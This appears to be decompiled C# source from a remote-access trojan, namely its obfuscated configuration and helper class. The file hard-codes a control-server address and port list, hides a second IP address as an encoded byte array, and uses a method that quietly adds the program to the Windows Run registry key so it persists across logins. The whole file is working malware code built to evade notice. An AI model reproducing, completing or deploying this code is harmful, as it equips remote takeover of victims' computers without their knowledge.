using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hdrmiprcav;

internal static class DAEONIF
{
	public static string my_path = Application.get_ExecutablePath();

	public static string my_app = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath());

	public static string main_tp = "10.115.126.108|".Split(new char[1] { '|' })[0];

	public static int[] ports = new int[5] { 6588, 8689, 12468, 18874, 22184 };

	public static byte[] main_cons = new byte[13]
	{
		49, 54, 55, 46, 56, 54, 46, 49, 48, 53,
		46, 52, 51
	};

	public static int port;

	public static string pc_ird = "dhevta|".Split(new char[1] { '|' })[0];

	public static string del_account = "iakina|".Split(new char[1] { '|' })[0];

	public static string ops_name()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!".Split(new char[1] { '!' })[0];
		}
	}

	public static void set_conup(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			object value = registryKey.GetValue(pc_ird + app);
			if (value == null || value.ToString() != path)
			{
				registryKey.SetValue(pc_ird + app, path);
			}
		}
		catch
		{
		}
	}

	public static string get_bytes_string(byte[] data)
	{
		char[] array = new char[data.Length];
		for (int i = 0; i < data.Length; i++)
		{
			char c = (array[i] = Convert.ToChar(data[i]));
		}
		return new string(array);
	}

	public static byte[] get_bytes_array(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string get_app_path()
	{
		return Path.GetDirectoryName(my_path) + "\\".ToString();
	}
}
